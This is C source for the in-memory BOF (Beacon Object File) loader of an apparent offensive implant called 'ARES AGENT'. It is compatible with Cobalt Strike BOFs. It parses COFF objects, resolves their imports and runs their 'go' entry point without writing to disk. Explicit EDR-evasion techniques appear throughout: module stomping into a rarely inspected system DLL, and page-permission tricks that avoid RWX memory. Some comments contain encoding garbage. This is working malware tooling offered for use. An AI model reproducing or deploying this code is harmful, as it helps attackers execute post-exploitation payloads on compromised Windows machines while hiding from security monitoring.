/*
 * Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 *  ARES AGENT Ã¢â‚¬â€ BOF Loader (Beacon Object File)
 *
 *  Loads and executes COFF object files in-memory.
 *  Compatible with Cobalt Strike BOF format:
 *    - Parses COFF headers + sections + relocations
 *    - Resolves imports via BeaconAPI compatibility layer
 *    - Executes "go" entry point with arguments
 *    - Captures output via internal buffer
 *
 *  No file touch disk. Execute COFF Ã¢â€ â€™ get output Ã¢â€ â€™ free.
 * Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 */

#include "ares_agent.h"
#include <stdio.h>
#include <string.h>

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *  Module Stomping config
 *  When CFG_MODULE_STOMP is defined, COFF sections are backed by
 *  the image of a sacrificial DLL instead of freshly-allocated
 *  RWX memory.  EDR sees legitimate module pages, not anonymous.
 * â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#ifdef CFG_MODULE_STOMP
/* DLL to stomp: must be a legit low-use system DLL loaded at runtime.
 * xolehlp.dll (MSDTC helper) is ~60 KB and almost never inspected. */
#ifndef STOMP_DLL
#define STOMP_DLL "xolehlp.dll"
#endif

typedef struct {
    HMODULE hMod;       /* LoadLibrary handle */
    BYTE*   base;       /* DLL image base */
    SIZE_T  image_size; /* SizeOfImage from PE header */
    DWORD*  old_protect;/* one entry per section page range */
} StompCtx;

static StompCtx g_stomp = {0};

/* Load the sacrifice DLL + unlock its .text section for writing */
static BOOL _stomp_init(SIZE_T needed)
{
    if (!g_stomp.hMod) {
        g_stomp.hMod = LoadLibraryA(STOMP_DLL);
        if (!g_stomp.hMod) return FALSE;
        g_stomp.base = (BYTE*)g_stomp.hMod;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)g_stomp.base;
        IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(g_stomp.base + dos->e_lfanew);
        g_stomp.image_size = nt->OptionalHeader.SizeOfImage;
    }
    if (needed > g_stomp.image_size) return FALSE; /* DLL too small */
    /* Make entire image RW so we can write COFF data into it */
    DWORD old;
    VirtualProtect(g_stomp.base, g_stomp.image_size, PAGE_READWRITE, &old);
    return TRUE;
}

/* Restore protections + free (called after BOF finishes) */
static void _stomp_cleanup(void)
{
    if (g_stomp.base && g_stomp.image_size) {
        DWORD old;
        VirtualProtect(g_stomp.base, g_stomp.image_size, PAGE_READONLY, &old);
    }
}

/* Allocate COFF section memory from within the stomped DLL image */
static BYTE* _stomp_alloc_sections(SIZE_T totalSize)
{
    if (!_stomp_init(totalSize)) return NULL;
    return g_stomp.base; /* sections packed from DLL base */
}
#endif /* CFG_MODULE_STOMP */

/* â”€â”€ BOF debug macro â”€â”€ */
#ifdef ARES_DEBUG
static void _bof_dbg(const char* msg) {
    HANDLE hf = CreateFileA("C:\\Temp\\ares2.log", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        SetFilePointer(hf, 0, NULL, FILE_END);
        char buf[256]; int n = snprintf(buf, sizeof(buf), "[BOF] %s\r\n", msg);
        DWORD w; WriteFile(hf, buf, n, &w, NULL);
        CloseHandle(hf);
    }
}
#define _BDBG(m) _bof_dbg(m)
#else
#define _BDBG(m)
#endif
/* Ã¢â€â‚¬Ã¢â€â‚¬ COFF Structures Ã¢â€â‚¬Ã¢â€â‚¬ */

#pragma pack(push, 1)

typedef struct _COFF_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COFF_FILE_HEADER;

typedef struct _COFF_SECTION {
    char  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SECTION;

typedef struct _COFF_SYMBOL {
    union {
        char ShortName[8];
        struct { DWORD Zeroes; DWORD Offset; } LongName;
    } Name;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct _COFF_RELOCATION {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COFF_RELOCATION;

#pragma pack(pop)

/* x64 relocation types */
#define IMAGE_REL_AMD64_ADDR64  0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32   0x0004
#define IMAGE_REL_AMD64_REL32_1 0x0005
#define IMAGE_REL_AMD64_REL32_2 0x0006
#define IMAGE_REL_AMD64_REL32_3 0x0007
#define IMAGE_REL_AMD64_REL32_4 0x0008
#define IMAGE_REL_AMD64_REL32_5 0x0009

/* Ã¢â€â‚¬Ã¢â€â‚¬ BeaconAPI Compatibility Layer Ã¢â€â‚¬Ã¢â€â‚¬ */
/* BOFs expect these functions to be available */

static char g_bof_output[65536];
static int  g_bof_output_len = 0;

/* Beacon output buffer */
void BeaconPrintf(int type, const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    g_bof_output_len += vsnprintf(
        g_bof_output + g_bof_output_len,
        sizeof(g_bof_output) - g_bof_output_len,
        fmt, args);
    va_end(args);
}

void BeaconOutput(int type, const char* data, int len)
{
    int copy = len;
    if (g_bof_output_len + copy > (int)sizeof(g_bof_output) - 1)
        copy = (int)sizeof(g_bof_output) - g_bof_output_len - 1;
    memcpy(g_bof_output + g_bof_output_len, data, copy);
    g_bof_output_len += copy;
}

/* Beacon data parser */
typedef struct _BEACON_DATA_PARSE {
    char* original;
    char* buffer;
    int   length;
    int   size;
} BEACON_DATA_PARSE;

void BeaconDataParse(BEACON_DATA_PARSE* parser, char* buffer, int size)
{
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size;
    parser->size = size;
}

int BeaconDataInt(BEACON_DATA_PARSE* parser)
{
    if (parser->length < 4) return 0;
    int val = *(int*)parser->buffer;
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(BEACON_DATA_PARSE* parser)
{
    if (parser->length < 2) return 0;
    short val = *(short*)parser->buffer;
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

char* BeaconDataExtract(BEACON_DATA_PARSE* parser, int* out_len)
{
    if (parser->length < 4) { *out_len = 0; return NULL; }
    int len = *(int*)parser->buffer;
    parser->buffer += 4;
    parser->length -= 4;
    if (len > parser->length) { *out_len = 0; return NULL; }
    char* data = parser->buffer;
    parser->buffer += len;
    parser->length -= len;
    *out_len = len;
    return data;
}

int BeaconDataLength(BEACON_DATA_PARSE* parser)
{
    return parser->length;
}

/* Dynamic function resolution for BOFs */
FARPROC BeaconGetProcAddress(const char* module, const char* function)
{
    HMODULE hMod = GetModuleHandleA(module);
    if (!hMod) hMod = LoadLibraryA(module);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, function);
}

/* BOF internal function table */
typedef struct _BOF_FUNC_TABLE {
    const char* name;
    PVOID addr;
} BOF_FUNC_TABLE;

static BOF_FUNC_TABLE g_bof_api[] = {
    { "BeaconPrintf",      (PVOID)BeaconPrintf },
    { "BeaconOutput",      (PVOID)BeaconOutput },
    { "BeaconDataParse",   (PVOID)BeaconDataParse },
    { "BeaconDataInt",     (PVOID)BeaconDataInt },
    { "BeaconDataShort",   (PVOID)BeaconDataShort },
    { "BeaconDataExtract", (PVOID)BeaconDataExtract },
    { "BeaconDataLength",  (PVOID)BeaconDataLength },
    { NULL, NULL }
};

/* Ã¢â€â‚¬Ã¢â€â‚¬ COFF Loader Engine Ã¢â€â‚¬Ã¢â€â‚¬ */

typedef void (*bof_entry)(char* args, int args_len);

/* v3.9: Thread-isolated BOF runner with crash protection */
static struct { bof_entry fn; char* args; int args_len; } g_bof_run;
/* No longjmp â€” just let thread die on exception; WaitForSingleObject + exit code detects it */
static LONG WINAPI _bof_veh(EXCEPTION_POINTERS* ep) {
    char _ex[128];
    snprintf(_ex, sizeof(_ex), "BOF VEH: 0x%08X at %p", (unsigned)ep->ExceptionRecord->ExceptionCode, ep->ExceptionRecord->ExceptionAddress);
    _BDBG(_ex);
    strncpy(g_bof_output, _ex, sizeof(g_bof_output)-1);
    g_bof_output_len = (int)strlen(g_bof_output);
    /* Mark as handled â€” ExitThread so only this thread dies */
    ExitThread(0xDEAD);
    return EXCEPTION_CONTINUE_EXECUTION;
}

static DWORD WINAPI _bof_runner(LPVOID param) {
    (void)param;
    PVOID veh = AddVectoredExceptionHandler(1, _bof_veh);
    _BDBG("BOF_EX: fn start");
    g_bof_run.fn(g_bof_run.args, g_bof_run.args_len);
    _BDBG("BOF_EX: fn done");
    if (veh) RemoveVectoredExceptionHandler(veh);
    return 0;
}

static PVOID resolve_symbol(const char* sym_name)
{
    /* Check BeaconAPI table first */
    for (int i = 0; g_bof_api[i].name; i++) {
        if (strcmp(sym_name, g_bof_api[i].name) == 0)
            return g_bof_api[i].addr;
    }

    /*
     * BOF external symbols use format: __imp_MODULE$FUNCTION
     * e.g., __imp_KERNEL32$CreateFileA
     */
    if (strncmp(sym_name, "__imp_", 6) == 0) {
        const char* modFunc = sym_name + 6;
        char module[128], function[128];

        const char* dollar = strchr(modFunc, '$');
        if (dollar) {
            int modLen = (int)(dollar - modFunc);
            if (modLen > 127) modLen = 127;
            memcpy(module, modFunc, modLen);
            module[modLen] = '\0';

            strncpy(function, dollar + 1, 127);
            function[127] = '\0';

            /* Append .dll if needed */
            if (!strchr(module, '.')) {
                strcat(module, ".dll");
            }

            return (PVOID)BeaconGetProcAddress(module, function);
        } else {
            /* No '$' separator: search common DLLs for the function name */
            static const char* common_dlls[] = {
                "kernel32.dll", "advapi32.dll", "user32.dll",
                "ntdll.dll", "iphlpapi.dll", "ws2_32.dll",
                "crypt32.dll", "shlwapi.dll", "shell32.dll",
                "netapi32.dll", "secur32.dll", "psapi.dll", NULL
            };
            for (int di = 0; common_dlls[di]; di++) {
                PVOID p = (PVOID)BeaconGetProcAddress((char*)common_dlls[di], (char*)modFunc);
                if (p) return p;
            }
        }
    }

    /* Handle ___chkstk_ms from GCC runtime (stack probe) */
    if (strcmp(sym_name, "___chkstk_ms") == 0) {
        PVOID p = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "__chkstk");
        if (!p) p = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "__chkstk");
        if (p) return p;
        /* Fallback: return a NOP stub - chkstk just returns if stack ok */
        return (PVOID)NULL; /* skip - handled by compiler for our own code */
    }

    /* CRT functions â€” resolve via ucrtbase.dll to avoid ABI mismatch with agent CRT */
    {
        static HMODULE hUcrt = NULL;
        if (!hUcrt) hUcrt = LoadLibraryA("ucrtbase.dll");
        if (!hUcrt) hUcrt = GetModuleHandleA("ucrtbase.dll");
        static const char* crt_names[] = {
            "snprintf","sprintf","strlen","strcpy","strncpy",
            "strcmp","strncmp","strstr","memcpy","memset","memcmp",
            "malloc","free","wcsstr","wcslen","wcscpy","wcsncpy",
            "vsnprintf","printf","puts","fwrite","fflush",NULL
        };
        for (int i = 0; crt_names[i]; i++) {
            if (strcmp(sym_name, crt_names[i]) == 0) {
                PVOID p = hUcrt ? (PVOID)GetProcAddress(hUcrt, sym_name) : NULL;
                if (p) return p;
            }
        }
    }

    /* Last resort: search all common DLLs for direct symbol (no prefix) */
    {
        static const char* all_dlls[] = {
            "kernel32.dll", "advapi32.dll", "user32.dll", "ntdll.dll",
            "iphlpapi.dll", "ws2_32.dll", "netapi32.dll", "shlwapi.dll",
            "shell32.dll", "crypt32.dll", "wtsapi32.dll", "secur32.dll",
            "psapi.dll", "tlhelp32.dll", "toolhelp.dll",
            "dbghelp.dll", "version.dll", NULL
        };
        for (int di = 0; all_dlls[di]; di++) {
            HMODULE hm = GetModuleHandleA(all_dlls[di]);
            if (!hm) hm = LoadLibraryA(all_dlls[di]);
            if (!hm) continue;
            PVOID p = (PVOID)GetProcAddress(hm, sym_name);
            if (p) return p;
        }
    }

    return NULL;
}

/* â”€â”€ Trampoline allocator for REL32 out-of-range calls â”€â”€ */
/* Alloc 16-byte trampoline within +-2GB of `near` using VirtualAlloc scan */
static BYTE* _alloc_trampoline_near(PVOID near_addr, PVOID target_addr) {
    /* Try to allocate within +/-1.5GB of near_addr */
    const SIZE_T RANGE = 0x60000000ULL; /* 1.5 GB */
    ULONG_PTR base = (ULONG_PTR)near_addr;
    ULONG_PTR lo   = (base > RANGE) ? (base - RANGE) : 0x10000;
    ULONG_PTR hi   = base + RANGE;
    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR try_addr;
    for (try_addr = base; try_addr < hi; try_addr += 0x10000) {
        if (!VirtualQuery((LPCVOID)try_addr, &mbi, sizeof(mbi))) break;
        if (mbi.State == MEM_FREE && mbi.RegionSize >= 16) {
            /* v5.0 FIX: RW→write→RX (no RWX pages — EDR evasion) */
            BYTE* t = (BYTE*)VirtualAlloc((LPVOID)try_addr, 16,
                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (t) {
                t[0]=0xFF; t[1]=0x25; t[2]=0x00; t[3]=0x00; t[4]=0x00; t[5]=0x00;
                *(DWORD64*)(t+6) = (DWORD64)target_addr;
                DWORD _op; VirtualProtect(t, 16, PAGE_EXECUTE_READ, &_op);
                return t;
            }
        }
        try_addr += mbi.RegionSize - (try_addr - (ULONG_PTR)mbi.BaseAddress);
        if (try_addr < (ULONG_PTR)mbi.BaseAddress) break;
    }
    /* Fallback scan downward */
    for (try_addr = base; try_addr > lo; try_addr -= 0x10000) {
        if (!VirtualQuery((LPCVOID)try_addr, &mbi, sizeof(mbi))) break;
        if (mbi.State == MEM_FREE && mbi.RegionSize >= 16) {
            /* v5.0 FIX: RW→write→RX (no RWX pages — EDR evasion) */
            BYTE* t = (BYTE*)VirtualAlloc((LPVOID)try_addr, 16,
                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (t) {
                t[0]=0xFF; t[1]=0x25; t[2]=0x00; t[3]=0x00; t[4]=0x00; t[5]=0x00;
                *(DWORD64*)(t+6) = (DWORD64)target_addr;
                DWORD _op; VirtualProtect(t, 16, PAGE_EXECUTE_READ, &_op);
                return t;
            }
        }
    }
    return NULL;
}

/* Allocate 8-byte IAT cell near fixup containing symAddr pointer */
static BYTE* _alloc_iat_cell(BYTE* fixup, PVOID symAddr) {
    const SIZE_T RANGE = 0x60000000ULL;
    ULONG_PTR base = (ULONG_PTR)fixup;
    ULONG_PTR hi   = base + RANGE;
    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR try_addr;
    for (try_addr = base; try_addr < hi; try_addr += 0x10000) {
        if (!VirtualQuery((LPCVOID)try_addr, &mbi, sizeof(mbi))) break;
        if (mbi.State == MEM_FREE && mbi.RegionSize >= 8) {
            BYTE* t = (BYTE*)VirtualAlloc((LPVOID)try_addr, 8,
                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (t) { *(DWORD64*)t = (DWORD64)symAddr; return t; }
        }
        try_addr += mbi.RegionSize - (try_addr - (ULONG_PTR)mbi.BaseAddress);
        if (try_addr < (ULONG_PTR)mbi.BaseAddress) break;
    }
    ULONG_PTR lo = (base > RANGE) ? (base - RANGE) : 0x10000;
    for (try_addr = base; try_addr > lo; try_addr -= 0x10000) {
        if (!VirtualQuery((LPCVOID)try_addr, &mbi, sizeof(mbi))) break;
        if (mbi.State == MEM_FREE && mbi.RegionSize >= 8) {
            BYTE* t = (BYTE*)VirtualAlloc((LPVOID)try_addr, 8,
                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (t) { *(DWORD64*)t = (DWORD64)symAddr; return t; }
        }
    }
    return NULL;
}

/*
 * _rel32_target: returns the address to encode in REL32 field.
 * If delta fits 32-bit -> return symAddr directly (no trampoline needed).
 * If overflow -> allocate trampoline near fixup and return trampoline addr.
 * Returns NULL only on FATAL ERROR (trampoline alloc fail).
 * Use PVOID return (not BYTE*) to avoid pointer-arithmetic confusion.
 */
static PVOID _rel32_target(BYTE* fixup, PVOID symAddr, int addend) {
    INT64 delta = (BYTE*)symAddr - fixup - 4 - addend;
    if (delta >= -0x7FFFFFFFLL && delta <= 0x7FFFFFFFLL)
        return symAddr; /* fits: direct encoding, no trampoline */
    /* Overflow: need trampoline */
    BYTE* tramp = _alloc_trampoline_near(fixup, symAddr);
    if (!tramp) return NULL; /* fatal: caller must abort BOF */
    return (PVOID)tramp;
}
int Ares_BOF_Execute(const BYTE* coff_data, SIZE_T coff_size,
    const char* args, int args_len,
    char* output, int output_max)
{
    _BDBG("BOF_EX: entry");
    if (coff_size < sizeof(COFF_FILE_HEADER)) { _BDBG("BOF_EX: bad size"); return -1; }

    _BDBG("BOF_EX: parsing header");
    /* Reset output buffer */
    g_bof_output_len = 0;
    g_bof_output[0] = '\0';

    /* Parse COFF header */
    COFF_FILE_HEADER* header = (COFF_FILE_HEADER*)coff_data;

if (header->Machine != 0x8664) /* IMAGE_FILE_MACHINE_AMD64 */
        return -1;

    COFF_SECTION* sections = (COFF_SECTION*)(coff_data + sizeof(COFF_FILE_HEADER));

    /* v3.2: Validate symbol table pointer is within bounds */
    if (header->PointerToSymbolTable + header->NumberOfSymbols * sizeof(COFF_SYMBOL) > coff_size)
        return -1;

    COFF_SYMBOL* symbols = (COFF_SYMBOL*)(coff_data + header->PointerToSymbolTable);
    char* stringTable = (char*)(symbols + header->NumberOfSymbols);

    _BDBG("BOF_EX: alloc sections");
    /* Single contiguous alloc - inter-section REL32 never overflows 2GB */
    BYTE** sectionData = (BYTE**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
        header->NumberOfSections * sizeof(BYTE*));
    SIZE_T* sectionOffsets = (SIZE_T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
        header->NumberOfSections * sizeof(SIZE_T));
    SIZE_T totalSize = 0;
    for (int i = 0; i < header->NumberOfSections; i++) {
        DWORD _sz = sections[i].SizeOfRawData;
        if (_sz == 0) _sz = sections[i].VirtualSize;
        sectionOffsets[i] = totalSize;
        if (_sz > 0) totalSize += (_sz + 0xFFF) & ~0xFFF;
    }
    BYTE* baseAlloc = NULL;
    if (totalSize > 0) {
#ifdef CFG_MODULE_STOMP
        baseAlloc = _stomp_alloc_sections(totalSize);
        if (!baseAlloc) {
            _BDBG("BOF_EX: stomp alloc fail, fallback VirtualAlloc");
            baseAlloc = (BYTE*)VirtualAlloc(NULL, totalSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        } else {
            _BDBG("BOF_EX: module stomp active");
        }
#else
        baseAlloc = (BYTE*)VirtualAlloc(NULL, totalSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
#endif
        if (!baseAlloc) { _BDBG("BOF_EX: VirtualAlloc fail"); goto cleanup; }
    }
    for (int i = 0; i < header->NumberOfSections; i++) {
        DWORD size = sections[i].SizeOfRawData;
        if (size == 0) size = sections[i].VirtualSize;
        if (size == 0) { sectionData[i] = NULL; continue; }
        sectionData[i] = baseAlloc + sectionOffsets[i];
        if (sections[i].SizeOfRawData > 0) {
            if (sections[i].PointerToRawData + sections[i].SizeOfRawData > coff_size) {
                VirtualFree(baseAlloc, 0, MEM_RELEASE);
                goto cleanup;
            }
            memcpy(sectionData[i], coff_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }
    HeapFree(GetProcessHeap(), 0, sectionOffsets);
    _BDBG("BOF_EX: process relocs");
    /* Process relocations */
    for (int i = 0; i < header->NumberOfSections; i++) {
        if (sections[i].NumberOfRelocations == 0) continue;
        if (!sectionData[i]) continue;

        COFF_RELOCATION* relocs = (COFF_RELOCATION*)
            (coff_data + sections[i].PointerToRelocations);

        for (int r = 0; r < sections[i].NumberOfRelocations; r++) {
            COFF_SYMBOL* sym = &symbols[relocs[r].SymbolTableIndex];

            /* Get symbol address */
            PVOID symAddr = NULL;
            char symName[256]; symName[0] = 0;

            if (sym->SectionNumber > 0) {
                /* Internal symbol Ã¢â‚¬â€ in a section */
                int secIdx = sym->SectionNumber - 1;
                if (sectionData[secIdx])
                    symAddr = sectionData[secIdx] + sym->Value;
            } else {
                /* External symbol Ã¢â‚¬â€ resolve dynamically */
                if (sym->Name.LongName.Zeroes == 0) {
                    strncpy(symName, stringTable + sym->Name.LongName.Offset, 255);
                } else {
                    memcpy(symName, sym->Name.ShortName, 8);
                    symName[8] = '\0';
                }
                symAddr = resolve_symbol(symName);
            }

                /* FAIL CLOSED: unresolved EXTERNAL symbol = abort BOF.
                 * Section-local symbols (SectionNumber > 0) already resolved above.
                 * Empty name after external path = malformed COFF -> skip. */
                if (!symAddr) {
                    if (symName[0] == '\0') {
                        /* Empty name: likely padding/aux symbol, skip */
                        continue;
                    }
                    char _eu[128];
                    snprintf(_eu,sizeof(_eu),"BOF ERR: unresolved sym=%s - aborting",symName);
                    _BDBG(_eu);
                    goto cleanup;
                }

            { char _dl[128]; snprintf(_dl,sizeof(_dl),"BOF reloc: sym=%s addr=%p",symName,(void*)symAddr); _BDBG(_dl); }
            /* Apply relocation */
            BYTE* fixup = sectionData[i] + relocs[r].VirtualAddress;

            switch (relocs[r].Type) {
                case IMAGE_REL_AMD64_ADDR64:
                    *(DWORD64*)fixup = (DWORD64)symAddr;
                    break;

                case IMAGE_REL_AMD64_ADDR32NB:
                    *(DWORD*)fixup = (DWORD)((BYTE*)symAddr - fixup - 4);
                    break;


                /*
                 * REL32 family: CALL rel32 / RIP-relative operand.
                 *
                 * __imp_* / .refptr.*  => INDIRECT: BOF emits CALL [RIP+X] or MOV reg,[RIP+X]
                 *   -> need 8-byte IAT cell NEAR fixup containing symAddr
                 *   -> REL32 field = (cell_addr - fixup - 4 - addend)
                 *   -> FAIL CLOSED if cell alloc fails
                 *
                 * everything else => DIRECT: CALL rel32 to code
                 *   -> trampoline if |delta| > 2GB
                 *   -> FAIL CLOSED if trampoline alloc fails
                 */
#define _DO_REL32(addend) \
    do { \
        BOOL _ind = (strncmp(symName,"__imp_",6)==0 || strncmp(symName,".refptr.",8)==0); \
        if (_ind) { \
            BYTE* _cell = _alloc_iat_cell(fixup, symAddr); \
            if (!_cell) { \
                char _em[128]; \
                snprintf(_em,sizeof(_em),"BOF ERR: IAT cell fail sym=%s",symName); \
                _BDBG(_em); goto cleanup; \
            } \
            *(DWORD*)fixup = (DWORD)(_cell - fixup - 4 - (addend)); \
        } else { \
            PVOID _tgt = _rel32_target(fixup, symAddr, (addend)); \
            if (!_tgt) { \
                char _em[128]; \
                snprintf(_em,sizeof(_em),"BOF ERR: trampoline fail sym=%s",symName); \
                _BDBG(_em); goto cleanup; \
            } \
            *(DWORD*)fixup = (DWORD)((BYTE*)_tgt - fixup - 4 - (addend)); \
        } \
    } while(0)

                case IMAGE_REL_AMD64_REL32:   _DO_REL32(0); break;
                case IMAGE_REL_AMD64_REL32_1: _DO_REL32(1); break;
                case IMAGE_REL_AMD64_REL32_2: _DO_REL32(2); break;
                case IMAGE_REL_AMD64_REL32_3: _DO_REL32(3); break;
                case IMAGE_REL_AMD64_REL32_4: _DO_REL32(4); break;
                case IMAGE_REL_AMD64_REL32_5: _DO_REL32(5); break;
#undef _DO_REL32
            }
        }
    }

    _BDBG("BOF_EX: find entry");
    /* Find "go" entry point */
    bof_entry entry = NULL;
    for (DWORD s = 0; s < header->NumberOfSymbols; s++) {
        char symName[256];
        if (symbols[s].Name.LongName.Zeroes == 0) {
            strncpy(symName, stringTable + symbols[s].Name.LongName.Offset, 255);
        } else {
            memcpy(symName, symbols[s].Name.ShortName, 8);
            symName[8] = '\0';
        }

        if (strcmp(symName, "go") == 0 && symbols[s].SectionNumber > 0) {
            int secIdx = symbols[s].SectionNumber - 1;
            if (sectionData[secIdx])
                entry = (bof_entry)(sectionData[secIdx] + symbols[s].Value);
            break;
        }
    }

if (!entry) goto cleanup;

    /* v3.2: Finalize section permissions (RWÃ¢â€ â€™RX for executable sections) */
    for (int i = 0; i < header->NumberOfSections; i++) {
        if (sectionData[i] && (sections[i].Characteristics & 0x20000000)) {
            DWORD oldProt;
            DWORD size = sections[i].SizeOfRawData;
            if (size == 0) size = sections[i].VirtualSize;
            VirtualProtect(sectionData[i], size, PAGE_EXECUTE_READ, &oldProt);
        }
    }

    /* v3.9: Execute BOF in isolated thread Ã¢â‚¬â€ crash protection.
     * If BOF crashes, only worker thread dies; agent survives.
     * 30s timeout prevents hung BOFs from blocking agent. */
    /* Ensure common DLLs are loaded/initialized before BOF runs */
    LoadLibraryA("iphlpapi.dll");
    LoadLibraryA("ucrtbase.dll");
    _BDBG("BOF_EX: about to run");
    g_bof_run.fn = entry;
    g_bof_run.args = (char*)args;
    g_bof_run.args_len = args_len;

HANDLE hBofThread = CreateThread(NULL, 0, _bof_runner, NULL, 0, NULL);
    if (hBofThread) {
        DWORD waitResult = WaitForSingleObject(hBofThread, 30000);
        if (waitResult == WAIT_TIMEOUT) {
            TerminateThread(hBofThread, 1);
            BeaconPrintf(0, "[!] BOF timeout after 30s");
        }
        CloseHandle(hBofThread);
    } else {
        /* Fallback: direct call if thread creation fails */
        entry((char*)args, args_len);
    }

    /* Copy output */
    int copyLen = g_bof_output_len;
    if (copyLen > output_max - 1) copyLen = output_max - 1;
    if (copyLen > 0) {
        memcpy(output, g_bof_output, copyLen);
    }
    output[copyLen] = '\0';

cleanup:
    /* Free section memory */
#ifdef CFG_MODULE_STOMP
    _stomp_cleanup();
    /* sectionData[] points into DLL image â€” don't VirtualFree */
#else
    if (baseAlloc) VirtualFree(baseAlloc, 0, MEM_RELEASE);
#endif
    HeapFree(GetProcessHeap(), 0, sectionData);

    return g_bof_output_len;
}





